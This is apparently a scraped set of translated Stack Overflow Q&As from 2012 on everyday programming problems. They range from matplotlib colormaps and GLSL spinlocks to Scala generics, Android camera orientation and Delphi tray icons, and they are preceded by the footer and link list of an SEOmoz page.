   completely blown out of the water? Well that's what happened during
   this year's nomination for a MozCation. Wait, wait, wait, before I get
   too far ahead of myself, I...
   [47]Read Full Entry

   13

   2
   [48]13 Comments
     __________________________________________________________________

Latest from the Community YouMoz Blog
     __________________________________________________________________

   [49]larry.kim

[50]Does SEO Even Work for Small Businesses?

   Posted by [51]larry.kim on 08/03/2012
   Clicks on paid search listings beat out organic listings by nearly a
   2:1 margin for keywords with high commercial intent in the US. Is SEO
   still a viable marketing tactic for the average small business owner?
   [52]Read Full Entry

   17

   3
   [53]28 Comments
     __________________________________________________________________

Voted Best SEO Tool 2010!

   [54]Try it for Free!

Looking for SEO consulting?

   SEOmoz doesn't provide consulting, but our friends at [55]Distilled
   still do. Rock on!

   Copyright ? 1996-2012 SEOmoz. All Rights Reserved.

Product and Tools

     * [56]SEOmoz PRO
     * [57]Pricing and Plans
     * [58]Open Site Explorer
     * [59]SEO Toolbar
     * [60]Mozscape API
     * [61]More SEO Tools

Company

     * [62]About
     * [63]SEO Blog
     * [64]YOUmoz Blog
     * [65]Affiliate Program
     * [66]Terms & Privacy Policy
     * [67]PRO Perks

Popular Content

     * [68]Link Building
     * [69]Reputation Management
     * [70]Analytics
     * [71]Social Media
     * [72]Content & Blogging
     * [73]See All Categories

Stay in Touch

     *
          + [74]RSS
          + [75]Twitter
          + [76]Facebook
          + [77]LinkedIn
     *

    SEOmoz
    119 Pine St. Suite 400
    Seattle, WA 98101
    206.632.3171
     * [78]Contact Us
     * [79]Sitemap

References

   1\. http://feeds.feedburner.com/seomoz
   2\. https://plus.google.com/112544075040456048636
   3\. http://www.seomoz.org/
   4\. https://www.seomoz.org/users/login
   5\. https://www.seomoz.org/users/register
   6\. http://www.seomoz.org/
   7\. http://www.seomoz.org/help
   8\. http://www.seomoz.org/q
   9\. http://seomoz.zendesk.com/forums/293194-seomoz-PRO-feature-requests
  10\. http://www.seomoz.org/about/contact
  11\. http://www.seomoz.org/features
  12\. http://www.seomoz.org/plans
  13\. http://www.seomoz.org/community
  14\. http://www.seomoz.org/blog
  15\. http://www.seomoz.org/ugc
  16\. http://www.seomoz.org/users
  17\. http://www.seomoz.org/about/events
  18\. http://www.seomoz.org/article/recommended
  19\. http://www.seomoz.org/resources
  20\. http://www.seomoz.org/learn-seo
  21\. http://www.seomoz.org/tools
  22\. http://www.seomoz.org/q
  23\. http://www.seomoz.org/api
  24\. http://www.seomoz.org/blog
  25\. http://www.seomoz.org/blog
  26\. http://www.seomoz.org/ugc
  27\. http://www.seomoz.org/about
  28\. http://www.seomoz.org/about/mission
  29\. http://www.seomoz.org/about/team
  30\. http://www.seomoz.org/about/contact
  31\. http://www.seomoz.org/about/jobs
  32\. http://www.seomoz.org/about/press
  33\. http://www.seomoz.org/about/seo-events
  34\. http://www.seomoz.org/cart/freetrial?pg=home
  35\. http://www.seomoz.org/features
  36\. http://www.seomoz.org/plans
  37\. http://feeds.feedburner.com/seomoz
  38\. http://twitter.com/seomoz
  39\. http://www.facebook.com/SEOmoz
  40\. https://plus.google.com/112544075040456048636?prsrc=3
  41\. http://www.seomoz.org/features
  42\. http://www.seomoz.org/features
  43\. http://www.seomoz.org/features
  44\. http://www.seomoz.org/users/profile/81197
  45\. http://www.seomoz.org/blog/winners-mozcation-2012
  46\. http://www.seomoz.org/users/profile/81197
  47\. http://www.seomoz.org/blog/winners-mozcation-2012
  48\. http://www.seomoz.org/blog/winners-mozcation-2012#comments
  49\. http://www.seomoz.org/users/profile/402613
  50\. http://www.seomoz.org/ugc/does-seo-even-work-for-small-businesses
  51\. http://www.seomoz.org/users/profile/402613
  52\. http://www.seomoz.org/ugc/does-seo-even-work-for-small-businesses
  53\. http://www.seomoz.org/ugc/does-seo-even-work-for-small-businesses#comments
  54\. http://www.seomoz.org/cart/freetrial?pg=features
  55\. http://www.seomoz.org/dp/distilled
  56\. http://www.seomoz.org/features
  57\. http://www.seomoz.org/plans
  58\. http://www.opensiteexplorer.org/
  59\. http://www.seomoz.org/seo-toolbar
  60\. http://www.seomoz.org/api
  61\. http://www.seomoz.org/tools
  62\. http://www.seomoz.org/about
  63\. http://www.seomoz.org/blog
  64\. http://www.seomoz.org/ugc
  65\. http://www.seomoz.org/dp/seomoz-pro-affiliate-program
  66\. http://www.seomoz.org/terms-and-privacy
  67\. http://www.seomoz.org/pro-perks
  68\. http://www.seomoz.org/blog/category/4
  69\. http://www.seomoz.org/blog/category/19
  70\. http://www.seomoz.org/blog/category/8
  71\. http://www.seomoz.org/blog/category/18
  72\. http://www.seomoz.org/blog/category/1
  73\. http://www.seomoz.org/blog
  74\. http://feeds.feedburner.com/seomoz
  75\. http://twitter.com/seomoz
  76\. http://www.facebook.com/SEOmoz
  77\. http://www.linkedin.com/groups?about=&gid=2976409&trk=anet_ug_grppro
  78\. http://www.seomoz.org/about/contact
  79\. http://www.seomoz.org/sitemap 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:17:06.153

您可能想要 grep for`<a href="`并将该值带到下一个引号符号。然后过滤掉所有 javascript 的东西。虽然这个解决方案可能也不是万无一失的。

# python - 如何使线图中的颜色在matplotlib和python中淡出

> ID：11820065
> 
> 赞同：2
> 
> 时间：2012-08-05T21:04:30.530
> 
> 标签：python, colors, matplotlib

我有两个数字，每个数字都有 3 个子图。在每个子图中，使用 for 循环有 20 条不同的曲线，代表 20 个步骤。如何使曲线的颜色逐渐变淡？就像我在下面的代码中一样，顶部的子图（311）有 20 条蓝色曲线......我怎样才能让第一步变成深蓝色并让蓝色逐渐褪色，直到最后一步变成浅蓝色？另外，如何让两个数字同时出现在屏幕上？现在，我必须手动关闭第一个图形才能弹出第二个图形。

```
from pylab import *
for raw_step in raw:
    raw_step = zip(*raw_step)
    Raw_Vertex, Raw_KI, Raw_KII, Raw_KIII = raw_step[0], raw_step[1], raw_step[2], raw_step[3]

    subplot(311)
    plot(Raw_Vertex, Raw_KI, 'bo-')
    grid(True)
    title('Raw SIFs')
    ylabel('K_I')

    subplot(312)
    plot(Raw_Vertex, Raw_KII, 'go-')
    grid(True)
    ylabel('K_II')

    subplot(313)
    plot(Raw_Vertex, Raw_KIII, 'ro-')
    grid(True)
    xlabel('Vertex')
    ylabel('K_III')

show()

for mls_step in mls:
    mls_step = zip(*mls_step)
    MLS_Vertex, MLS_KI, MLS_KII, MLS_KIII = mls_step[0], mls_step[1], mls_step[2], mls_step[3]

    subplot(311)
    plot(MLS_Vertex, MLS_KI, 'bo-')
    grid(True)
    title('MLS SIFs')
    ylabel('K_I')

    subplot(312)
    plot(MLS_Vertex, MLS_KII, 'go-')
    grid(True)
    ylabel('K_II')

    subplot(313)
    plot(MLS_Vertex, MLS_KIII, 'ro-')
    grid(True)
    xlabel('Vertex')
    ylabel('K_III')

show() 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-05T21:53:40.067

要获得浅蓝色调，请使用

```
blues = plt.get_cmap('Blues')  # this returns a colormap
color = blues(1 - float(i)/(len(raw)-1)) # blues(x) returns a color for each x between 0.0 and 1.0 
```

* * *

要并排放置子图，请使用`fig.add_subplots(row, columns, n)`定义 6 个轴。

```
fig = plt.figure()
ax[1] = fig.add_subplot(3, 2, 1) # 3x2 grid, 1st plot
...
ax[6] = fig.add_subplot(3, 2, 6) # 3x2 grid, 6th plot 
```

* * *

```
import matplotlib.pyplot as plt
import numpy as np

raw = range(20)
mls = range(20)
ax = {}
blues = plt.get_cmap('Blues')
reds = plt.get_cmap('Reds')
greens = plt.get_cmap('Greens')

fig = plt.figure()

ax[1] = fig.add_subplot(3, 2, 1)
ax[1].set_title('Raw SIFs')
ax[1].grid(True)
ax[1].set_ylabel('K_I')

ax[3] = fig.add_subplot(3, 2, 3)
ax[3].grid(True)
ax[3].set_ylabel('K_II')

ax[5] = fig.add_subplot(3, 2, 5)
ax[5].grid(True)
ax[5].set_xlabel('Vertex')
ax[5].set_ylabel('K_III')

ax[2] = fig.add_subplot(3, 2, 2)
ax[2].set_title('MLS SIFs')
ax[2].grid(True)
ax[2].set_ylabel('K_I')

ax[4] = fig.add_subplot(3, 2, 4)
ax[4].grid(True)
ax[4].set_ylabel('K_II')

ax[6] = fig.add_subplot(3, 2, 6)
ax[6].grid(True)
ax[6].set_xlabel('Vertex')
ax[6].set_ylabel('K_III')

for i, raw_step in enumerate(raw):
    Raw_Vertex = np.arange(10)
    Raw_KI = Raw_Vertex*(i+1)
    Raw_KII = Raw_Vertex*(i+1)
    Raw_KIII = Raw_Vertex*(i+1)
    ax[1].plot(Raw_Vertex, Raw_KI, 'o-', color = blues(1 - float(i)/(len(raw)-1)))
    ax[3].plot(Raw_Vertex, Raw_KII, 'o-', color = greens(1 - float(i)/(len(raw)-1)))
    ax[5].plot(Raw_Vertex, Raw_KIII, 'o-', color = reds(1 - float(i)/(len(raw)-1)))

for i, mls_step in enumerate(mls):
    MLS_Vertex = np.arange(10)
    MLS_KI = MLS_Vertex**2*(i+1)
    MLS_KII = MLS_Vertex**2*(i+1)
    MLS_KIII = Raw_Vertex**2*(i+1)

    ax[2].plot(MLS_Vertex, MLS_KI, 'o-', color = blues(1 - float(i)/(len(mls)-1)))
    ax[4].plot(MLS_Vertex, MLS_KII, 'o-', color = greens(1 - float(i)/(len(mls)-1)))
    ax[6].plot(MLS_Vertex, MLS_KIII, 'o-', color = reds(1 - float(i)/(len(mls)-1)))

plt.show() 
```

![在此处输入图像描述](../Images/b2fb1d34dbee2fdbaa0d65feda31f963.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-16T10:00:01.710

如果您希望在颜色选择上更加灵活，那么我建议您使用`colorsys`;

它有一些非常有用的功能可以在不同的颜色图之间进行转换； [http://en.wikipedia.org/wiki/HSL_and_HSV](http://en.wikipedia.org/wiki/HSL_and_HSV)，它可以给你更多的灵活性。

[http://docs.python.org/library/colorsys.html](http://docs.python.org/library/colorsys.html)

你可以像这样使用它：

```
ax[1].plot(Raw_Vertex, Raw_KI, 'o-', color =colorsys.hsv_to_rgb(0,1-i/float(curves),1)) 
```

以更直观的方式轻松将亮度、暗度和颜色更改为您想要的任何位置。 ![在此处输入图像描述](../Images/e4bf421b508f5227139cc387837229ea.png)

# concurrency - GLSL SpinLock 仅在大多数情况下有效

> ID：11820066
> 
> 赞同：1
> 
> 时间：2012-08-05T21:04:32.183
> 
> 标签：concurrency, glsl

[我已经使用 GLSL 自旋锁（受此](https://stackoverflow.com/questions/10652862/glsl-semaphores)启发）实现了深度剥离算法。在下面的可视化中，请注意深度剥离算法在整体上是如何正确运行的（第一层左上角，第二层右上角，第三层左下角，第四层右下角）。四个深度层存储在单个 RGBA 纹理中。

不幸的是，自旋锁有时不能防止错误——你可以看到小的白色斑点，特别是在第四层。第二层飞船的机翼上也有一个。这些散斑在每一帧都不同。

![在此处输入图像描述](../Images/59f3a98b67bfdeb881b40ae706b4edae.png)

在我的 GLSL 自旋锁中，当要绘制片段时，片段程序会原子地读取锁定值并将其写入单独的锁定纹理，直到出现 0，表示锁已打开。 [在实践](https://stackoverflow.com/questions/11809421/glsl-spinlock-never-terminates)中，我发现程序必须是并行的，因为如果两个线程在同一个像素上，warp 就无法继续（一个必须等​​待，而另一个继续，GPU 线程 warp 中的所有线程必须同时执行）。

我的片段程序看起来像这样（添加了注释和间距）：

```
#version 420 core

//locking texture
layout(r32ui) coherent uniform uimage2D img2D_0;
//data texture, also render target
layout(RGBA32F) coherent uniform image2D img2D_1;

//Inserts "new_data" into "data", a sorted list
vec4 insert(vec4 data, float new_data) {
    if      (new_data<data.x) return vec4(      new_data,data.xyz);
    else if (new_data<data.y) return vec4(data.x,new_data,data.yz);
    else if (new_data<data.z) return vec4(data.xy,new_data,data.z);
    else if (new_data<data.w) return vec4(data.xyz,new_data      );
    else                      return data;
}

void main() {
    ivec2 coord = ivec2(gl_FragCoord.xy);

    //The idea here is to keep looping over a pixel until a value is written.
    //By looping over the entire logic, threads in the same warp aren't stalled
    //by other waiting threads.  The first imageAtomicExchange call sets the
    //locking value to 1\.  If the locking value was already 1, then someone
    //else has the lock, and can_write is false.   If the locking value was 0,
    //then the lock is free, and can_write is true.  The depth is then read,
    //the new value inserted, but only written if can_write is true (the
    //locking texture was free).  The second imageAtomicExchange call resets
    //the lock back to 0.

    bool have_written = false;
    while (!have_written) {
        bool can_write = (imageAtomicExchange(img2D_0,coord,1u) != 1u);

        memoryBarrier();

        vec4 depths = imageLoad(img2D_1,coord);
        depths = insert(depths,gl_FragCoord.z);

        if (can_write) {
            imageStore(img2D_1,coord,depths);
            have_written = true;
        }

        memoryBarrier();

        imageAtomicExchange(img2D_0,coord,0);

        memoryBarrier();
    }
    discard; //Already wrote to render target with imageStore
} 
```

我的问题是为什么会出现这种斑点行为？我希望自旋锁 100% 的时间都在工作！它可能与我放置 memoryBarrier() 的位置有关吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-28T21:51:03.663

作为参考，这里是经过测试可在 GTX670 上的 Nvidia 驱动程序 314.22 和 320.18 上运行的锁定代码。请注意，如果代码被重新排序或重写为逻辑等效的代码，则会触发现有的编译器优化错误（请参阅下面的注释。）注意在下面我使用无绑定图像引用。

```
// sem is initialized to zero
coherent uniform layout(size1x32) uimage2D sem;

void main(void)
{
    ivec2 coord = ivec2(gl_FragCoord.xy);

    bool done = false;
    uint locked = 0;
    while(!done)
    {
     // locked = imageAtomicCompSwap(sem, coord, 0u, 1u); will NOT work
        locked = imageAtomicExchange(sem, coord, 1u);
        if (locked == 0)
        {
            performYourCriticalSection();

            memoryBarrier();

            imageAtomicExchange(sem, coord, 0u);

            // replacing this with a break will NOT work
            done = true;
        }
    }

    discard;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-31T05:48:55.030

“imageAtomicExchange(img2D_0,coord,0);” 需要在 if 语句中，因为即使对于没有它的线程，它也会重置锁变量！改变这个可以修复它。

# google-app-engine - Google App Engine - how to set up an SSL for Custom Domain

> ID：11820069
> 
> 赞同：0
> 
> 时间：2012-08-05T21:05:01.917
> 
> 标签：google-app-engine, ssl, dns, certificate, ssl-certificate

Google App Engine offers [SSL for Custom Domains](https://developers.google.com/appengine/docs/ssl), but I'm not sure how to properly set it up with my app. Say I'm running `myapp.appspot.com` and I own `myapp.com`, can someone explain to me the exact steps I need to take in order to make my App Engine app serve on my .com domain?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:35:10.380

好吧，这里描述了设置自定义域的基本过程： [https ://developers.google.com/appengine/docs/domain](https://developers.google.com/appengine/docs/domain)

那篇文章有什么不清楚的地方吗？

本文确实委托了该过程的一个重要部分，即为您的域设置 Google Apps 帐户（请参阅第 3 步中的“否则，请单击注册 Google Apps 并继续此步骤。”）。设置的一个关键部分是验证您是否拥有您尝试设置的域。这要求您对您的站点进行少量修改，或提供 DNS TXT 记录。在此处阅读更多信息：http: [//support.google.com/a/bin/answer.py ?hl=en&answer=60216](http://support.google.com/a/bin/answer.py?hl=en&answer=60216)

# scala - Scala：将子类中的有序比较限制为同一子类

> ID：11820071
> 
> 赞同：1
> 
> 时间：2012-08-05T21:05:09.217
> 
> 标签：scala, types

我正在尝试比较扑克手，如下所示。我一直在玩不同类型的运算符，但会对一些指导感兴趣。我的目标是拥有一个声明的抽象父类`Ordered`（这样就不需要在每个子类上声明它），但是参数化将使得每个子类只能与同一类的实例进行比较。

例如，在下面， a`HighCard`只能与 another `HighCard`、`TwoPair`与 another`TwoPair`等进行比较。

```
 sealed abstract class HandValue(rank: Int) extends Ordered[?]
    case class HighCard(high: Int) extends HandValue(0){
        def compare(that: HighCard) = ...
    }
    case class TwoPair(high: Int, big: Int, sm: Int) extends HandValue(2) {
        def compare(that: TwoPair) = ...
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T21:19:32.950

[*F* -bounded polymorphism](http://en.wikipedia.org/wiki/Bounded_quantification#F-bounded_quantification)是完成这种事情的一种常用方法：

```
sealed abstract class HandValue[A <: HandValue[A]](rank: Int) extends Ordered[A]

case class HighCard(high: Int) extends HandValue[HighCard](0){
    def compare(that: HighCard) = ...
}

case class TwoPair(high: Int, big: Int, sm: Int) extends HandValue[TwoPair](2) {
    def compare(that: TwoPair) = ...
} 
```

不得不将自己作为类型参数交给您要扩展的东西可能感觉有点像样板，但这是一种非常方便的方式，可以专门讨论父类中的子类类型。

# vim - 使用 sed 命令用 Vim 替换多个文件中的字符串

> ID：11820075
> 
> 赞同：2
> 
> 时间：2012-08-05T21:05:41.113
> 
> 标签：vim

我想使用 call:Rep(new,old) 将旧字符串替换为新字符串。所以我的伪代码是这样的......

我是 vimscript 的新手，我不知道该怎么做。

```
function! Rep(old,new)
   !sed -i.bak 's/#{old}/#{new}/g' *
endfunction 
```

你有什么主意吗？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T21:20:25.197

将您的功能更改为

```
function! Rep(old,new)
   exe "!sed -i.bak 's/".a:old."/".a:new."/g' *"
endfunction 
```

然后使用`:call Rep(old,new)`. 您也可以为它创建一个命令。

```
command! -nargs=+ Rep call Rep(<args>) 
```

这样你就可以做到`:Rep old new`。

# iphone - Implementing a UISearchBar

> ID：11820077
> 
> 赞同：-2
> 
> 时间：2012-08-05T21:05:49.547
> 
> 标签：iphone, ios, uitableview, uisearchbar

I am looking to add a way to have a user search through my server for certain book titles. The user should be able to search using a string within a `UISearchBar`, and the results from the server should be displayed in a `UITableView` below the search bar. What would be the easiest way to implement something like this?
Thanks for any help.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:23:57.957

不知道你到底在问什么。当然，在 UISearchBar 中输入某些内容的那一刻，您的委托方法就会被调用，并且您在后台开始您的客户端服务器通信并填充表格。取决于负载的重量，但我认为为了获得最佳用户体验，您只填充一定数量的单元格，最后一个单元格是“负载更多”以避免长时间等待。

# css - Why does my bootstrap-powered app website look so ugly in MSIE 8-

> ID：11820082
> 
> 赞同：0
> 
> 时间：2012-08-05T21:06:26.323
> 
> 标签：css, html, twitter-bootstrap

My website is [http://everythingfunny.net](http://everythingfunny.net)

If you look at it in almost any browser (Firefox, Chrome, Opera, Android Browser, etc) it looks the way i'd like for it to. I was at my parent's house, and they use IE8, and boy does the site look like a train wreck. How can I make my site more IE compatable. This is why I hate front-end development so much. Thanks in advance!

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-05T21:21:18.767

您的网页没有文档类型。结果，在 IE 中触发了 quirks 模式。

在您的网页开头添加以下内容：

```
<!doctype html> 
```

* * *

至于 IE7 中的页面偏离中心，这是由以下 CSS 代码引起的：

```
.row {
    zoom: 1;
} 
```

删除`zoom`声明，页面将在 IE7 中正确居中。

# objective-c - Link to iTunes have to restart app

> ID：11820084
> 
> 赞同：0
> 
> 时间：2012-08-05T21:06:39.087
> 
> 标签：objective-c, ios, itunes

Im Linking to appstore from my app using

```
`NSString *iTunesLink = @"itms-apps://itunes.com/apps/companyname/";
     [[UIApplication sharedApplication] openURL:[NSURL URLWithString:iTunesLink]]; 
```

This works, but when returning to my app it's just a blank screen and I have to restart the app.

Am I missing some fundemanatal piece of code here

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:52:59.337

尝试使用这种格式的链接 itms-apps://ax.itunes.apple.com/app/id123456789

# database - Are there any 3NF tables in the MySQL employee sample database?

> ID：11820086
> 
> 赞同：0
> 
> 时间：2012-08-05T21:07:07.110
> 
> 标签：database, denormalization, 3nf

I am currently working on a question where I am asked to denormalize any two tables from 3NF to 2NF from the MySQL employees sample database.

My problem is that from the schema I can't determine any 3NF tables. Am I blind? The shema is shown below and is taken from [this](http://dev.mysql.com/doc/employee/en/sakila-structure.html) MySQL page.

I would appreciate if somebody could verify that my thinking.. thanks.

!['employees' database schema](../Images/d4bb29e9a170f71181d1ce743aa9c3cf.png)

# android - Android中Camera拍摄的旋转图片

> ID：11820092
> 
> 赞同：1
> 
> 时间：2012-08-05T21:07:59.950
> 
> 标签：android, camera, rotation

我正在尝试做一个应用程序，用前置摄像头在没有 UI 的情况下拍照，我已经成功地做到了，但唯一的问题是照片总是在横向模式下拍摄，有什么方法可以强制它进入纵向模式?

```
public class TakePicture extends Activity implements SurfaceHolder.Callback
{
    private ImageView iv_image;
    private SurfaceView sv;

    private Bitmap bmp;

    private SurfaceHolder sHolder;  
    private Camera mCamera;
    private int cameraId = 1;
    private Parameters parameters;

    @Override
    public void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        iv_image = (ImageView) findViewById(R.id.imageView);
        sv = (SurfaceView) findViewById(R.id.surfaceView);        
        sHolder = sv.getHolder();

        sHolder.addCallback(this);

        sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS); 
    }

    public void surfaceChanged(SurfaceHolder arg0, int arg1, int arg2, int arg3) 
    {
parameters = mCamera.getParameters();
         mCamera.setParameters(parameters);
         mCamera.startPreview();

         //mCamera.setDisplayOrientation(90);
         //sets what code should be executed after the picture is taken
         Camera.PictureCallback mCall = new Camera.PictureCallback() 
         {
                public void onPictureTaken(byte[] data, Camera camera) {

                    File pictureFileDir = getDir();

                    if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {

                        Log.d("DEBUG", "Can't create directory to save image.");
                        Toast.makeText(TakePicture.this, "Can't create directory to save image.",
                                Toast.LENGTH_LONG).show();
                        return;

                    }

                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyymmddhhmmss");
                    String date = dateFormat.format(new Date());
                    String photoFile = "Picture_" + date + ".jpg";

                    String filename = pictureFileDir.getPath() + File.separator + photoFile;

                    File pictureFile = new File(filename);

                    try {
                        FileOutputStream fos = new FileOutputStream(pictureFile);
                        fos.write(data);
                        fos.close();
                        Toast.makeText(TakePicture.this, "New Image saved:" + photoFile,
                                Toast.LENGTH_LONG).show();
                        finish();
                    } catch (Exception error) {
                        Log.d("DEBUG", "File" + filename + "not saved: "
                                + error.getMessage());
                        Toast.makeText(TakePicture.this, "Image could not be saved.",
                                Toast.LENGTH_LONG).show();
                    }
                }
         };

         mCamera.takePicture(null, null, mCall);

    }

    public void surfaceCreated(SurfaceHolder holder) 
    {
        // The Surface has been created, acquire the camera and tell it where
        // to draw the preview.
        //mCamera = Camera.open();
        mCamera = Camera.open(cameraId);
        try {
           mCamera.setPreviewDisplay(holder);

        } catch (IOException exception) {
            mCamera.release();
            mCamera = null;
        }
    }

    public void surfaceDestroyed(SurfaceHolder holder) 
    {
        //stop the preview
        mCamera.stopPreview();
        //release the camera
        mCamera.release();
        //unbind the camera from this object
        mCamera = null;
    }  

    private File getDir() {
        File sdDir = Environment
          .getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        return new File(sdDir, "Camera!");
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:22:19.960

据我记得尝试这样做时，这有点棘手。

我发现的一种方法是：

```
public void surfaceCreated(SurfaceHolder holder) {
    mCamera = Camera.open();

    Parameters params = mCamera.getParameters();
    if (this.getResources().getConfiguration().orientation != Configuration.ORIENTATION_LANDSCAPE) {
        params.set("orientation", "portrait");

        try {
            //not sure if this block of code had an OR relationship with the previous line params.set("orientation", "portrait");
            Method rotateSet = Camera.Parameters.class.getMethod("setRotation", new Class[] { Integer.TYPE });
            Object arguments[] = new Object[] { new Integer(90) };
            rotateSet.invoke(params, arguments);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    mCamera.setParameters(params);

    try {
        mCamera.setPreviewDisplay(holder);
    } catch (IOException exception) {
        mCamera.release();
        mCamera = null;
    }
} 
```

但这对我不起作用（尽管我使用的是高于 2.0 的 Android 版本，这应该可以工作）。

我还发现了一个使用反射的hack，并且有效：

```
public void surfaceCreated(SurfaceHolder holder) {
    mCamera = Camera.open();

    if (this.getResources().getConfiguration().orientation != Configuration.ORIENTATION_LANDSCAPE) {}
    setDisplayOrientation(mCamera, 90);

    try {
        mCamera.setPreviewDisplay(holder);
    } catch (IOException exception) {
        mCamera.release();
        mCamera = null;
    }
} 
```

其中 setDisplayOrientation 是：

```
protected void setDisplayOrientation(Camera camera, int angle){
    Method setDisplayOrientationMethod;
    try {
        setDisplayOrientationMethod = camera.getClass().getMethod("setDisplayOrientation", new Class[] { int.class });
        if (setDisplayOrientationMethod != null) {
            setDisplayOrientationMethod.invoke(camera, new Object[] {angle});
        }

    } catch (Exception e1) {}
} 
```

# java - Java 在类外调用函数

> ID：11820094
> 
> 赞同：1
> 
> 时间：2012-08-05T21:08:03.617
> 
> 标签：java, oop, class, function

有没有办法在类外调用函数？我不知道怎么说，但我有一个例子。

```
class Class1{
    class Class2{
          public void callFunctionInC1(){
                //how can I call funtionNeedtoBeCalled
          }
    }
    public Class1(){
          Class2 c2 = new Class2();
          c2.callFunctionInC1();
    }
    public void functionNeedtoBeCalled(){
          //do something
    }
 } 
```

这听起来很奇怪，但我确实有理由这样做。有没有办法做到这一点？谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T21:13:03.037

```
Class1.this.functionNeedtoBeCalled(); 
```

这是一个包含更多讨论的链接。[http://www.velocityreviews.com/forums/t137884-inner-class-explicit-outer-class-method-call.html](http://www.velocityreviews.com/forums/t137884-inner-class-explicit-outer-class-method-call.html)

[从内部类调用外部类函数](https://stackoverflow.com/questions/2808501/calling-outer-class-function-from-inner-class)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-05T21:11:00.560

是的：`Class1.this.functionNeedtoBeCalled();`

# ios - 无法从 UIViewController 访问 UIView 的 UIColor 属性

> ID：11820096
> 
> 赞同：3
> 
> 时间：2012-08-05T21:08:35.617
> 
> 标签：ios, xcode, uiview, properties, uiviewcontroller

尝试在主 UIViewController 的 UIView 子类上设置 UIColor 变量。我有一个用于检索 UIViewController 中请求的颜色的属性，并且我有一个用于在 UIView 上接收颜色的属性。但是，当我使用 dot 方法应用检索到的颜色时，我收到错误“在 'UIView *' 类型的对象上找不到属性“brushColor””

//控制器.h

```
@interface ViewController : UIViewController {
    UIColor *colorPicked;
    UIView *drawScreen;
}
@property (nonatomic, strong) UIView *drawScreen;

@property (nonatomic, strong) UIColor *colorPicked; 
```

//控制器.m

```
@implementation ViewController

@synthesize drawScreen;
@synthesize colorPicked;

- (void)viewDidLoad{   
    self.drawScreen = [[DrawingView alloc] initWithFrame:CGRectMake(0, 44, 1024, 724)];
    drawScreen.backgroundColor = [UIColor clearColor];

    drawScreen.brushColor = self.colorPicked;   //This line errors stating the property is not available on type (UIView *)

    [self.view addSubview:drawScreen];

    [super viewDidLoad];
} 
```

//查看.h

```
@interface DrawingView : UIView{

    UIColor *brushColor;

    UIBezierPath *myPath;
}

@property (nonatomic, retain) UIColor *brushColor;

@end 
```

//查看.m

```
@implementation DrawingView

@synthesize brushColor;

- (void)drawRect:(CGRect)rect{

    myPath = [[UIBezierPath alloc] init];

    [brushColor setStroke];

    [myPath strokeWithBlendMode:kCGBlendModeNormal alpha:1.0];

}

@end 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T21:11:38.180

您已声明`drawScreen`为`UIView`，将其在 .h 中的声明更改为

```
@property (nonatomic, strong) DrawingView *drawScreen; 
```

并更改 ivar 声明以匹配（或完全删除它，因为您仍然使用属性）

# delphi - 将 Delphi 窗体最小化到系统托盘

> ID：11820105
> 
> 赞同：15
> 
> 时间：2012-08-05T21:09:56.080
> 
> 标签：delphi, delphi-xe2

我是德尔福学习者。我正在寻找解决方案，以便将 Delphi MainForm 最小化到系统托盘而不是任务栏。在系统托盘图标上右键单击应该有一些菜单，如“恢复”和“关于”和“帮助”等。系统托盘图标将从 Imagelis1 加载，它会动画。点击“Restore”主窗体将被恢复，点击“About”“Form2”将被恢复，点击“Help”“Foprm3”将被恢复。我在互联网上找到了很多解决方案，例如：

[解决方案01](https://stackoverflow.com/questions/2889291/delphi-minimize-application-to-systray)

[解决方案02](https://stackoverflow.com/questions/6228966/how-to-minimize-a-window-to-the-taskbar-i-e-not-iconify)

但每个解决方案都有一些缺点。有些可以一次完成。有些在 Windows7 中有模糊的图标。有人可能会说没有人为我写代码，我必须展示我的代码。请原谅我的这方面。请给我具体的解决方案，以便它可以在没有windows版本依赖的情况下普遍实现。它将帮助每一个人。请帮我。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-06T02:10:03.130

这应该让你继续前进。将 a`TTrayIcon`和 a`TApplicationEvents`放在您的表格上。以下代码`TTrayIcon - Delphi Example`来自[docwiki](http://docwiki.embarcadero.com/CodeExamples/en/TTrayIcon_%28Delphi%29)。使用 IDE 主菜单，然后选择`Project->View Source`，以及读取`Application.ShowMainFormOnTaskbar := True;`为 `Application.ShowMainFormOnTaskbar := False;' 的行 以防止应用程序的按钮出现在 Windows 任务栏上。

> 此示例在表单上使用托盘图标和应用程序事件组件。当应用程序运行时，它会加载托盘图标，动画时显示的图标，它还会设置一个提示气球。当您最小化窗口时，表单被隐藏，提示气球出现，托盘图标显示和动画。双击系统托盘图标可恢复窗口。

```
// Add this to the `TApplicationEvents.OnMinimize` event handler
procedure TForm1.ApplicationEvents1Minimize(Sender: TObject);
begin
  { Hide the window and set its state variable to wsMinimized. }
  Hide();
  WindowState := wsMinimized;

  { Show the animated tray icon and also a hint balloon. }
  TrayIcon1.Visible := True;
  TrayIcon1.Animate := True;
  TrayIcon1.ShowBalloonHint;
end;

// Add this to the `TForm.OnCreate` event handler
procedure TForm1.FormCreate(Sender: TObject);
var
  MyIcon : TIcon;
begin
  { Load the tray icons. }
  TrayIcon1.Icons := TImageList.Create(Self);
  MyIcon := TIcon.Create;
  MyIcon.LoadFromFile('icons/earth1.ico');
